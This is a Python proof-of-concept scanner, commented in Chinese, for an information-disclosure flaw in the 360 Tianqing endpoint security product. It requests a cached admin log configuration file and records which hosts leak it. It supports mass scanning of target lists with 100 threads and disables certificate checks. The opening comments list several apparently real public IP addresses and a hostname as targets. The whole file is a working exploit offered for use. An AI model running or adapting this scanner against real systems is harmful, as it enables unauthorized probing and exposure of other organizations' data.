# https://125.64.225.138:8443
# https://219.139.39.135:8443
# http://61.153.10.79:8080
# http://218.2.231.183:9080
# http://gw.wzer.net:8080

#导入模块
import requests,re,argparse,sys
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


#定义banner()函数
def banner():
    banner = '''你好,欢迎使用360天擎安全脚本!'''
    print(banner)

#定义poc()函数
def poc(target):
    payload = "/runtime/admin_log_conf.cache"
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0'
    }
    try:
        result =requests.get(url=target,headers=headers,verify=False,timeout=5)
        if result.status_code == 200:
            result1 = requests.get(url=target + payload,headers=headers,verify=False,timeout=10)
            content = re.findall(r's:12:"(.*?)";',result1.text,re.S)
            if "/login/login" in content:
                print(f"[+]{target}存在任意文件读取漏洞")
                with open("result_360.txt","a",encoding='utf-8') as f:
                    f.write(f"{target}存在任意文件读取漏洞\n")
            else:
                print(f"[-]{target}不存在任意文件读取漏洞")
        else:
            print(f"[-]{target}网址不存在或未开放")
    except Exception as e:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser("360天擎信息泄露脚本")
    parser.add_argument("-u", "--url",dest="url",type=str, help="目标URL")
    parser.add_argument("-f","--file",dest="file",type=str,help="目标文件")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()